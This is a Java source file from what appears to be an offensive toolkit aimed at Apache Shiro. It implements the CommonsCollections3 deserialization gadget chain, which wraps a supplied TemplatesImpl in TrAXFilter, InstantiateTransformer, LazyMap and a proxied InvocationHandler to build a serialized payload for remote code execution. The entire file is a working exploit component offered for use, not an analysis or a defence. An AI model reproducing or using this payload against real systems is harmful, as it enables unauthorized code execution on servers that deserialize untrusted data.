package com.liev.clouds.payload.shiro;

import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.Gadgets;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;



@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections3 implements ObjectPayload<Object> {
    @Override
    public Object getObject(Object templatesImpl) throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] { (Transformer)new ConstantTransformer(Integer.valueOf(1)) });

        Transformer[] transformers = { (Transformer)new ConstantTransformer(TrAXFilter.class), (Transformer)new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { templatesImpl }) };


        Map<Object, Object> innerMap = new HashMap<>();

        Map lazyMap = LazyMap.decorate(innerMap, (Transformer)chainedTransformer);

        Map mapProxy = (Map) Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]);

        InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

        ReflectionsUtils.setFieldValue(chainedTransformer, "iTransformers", transformers);

        return handler;
    }
}


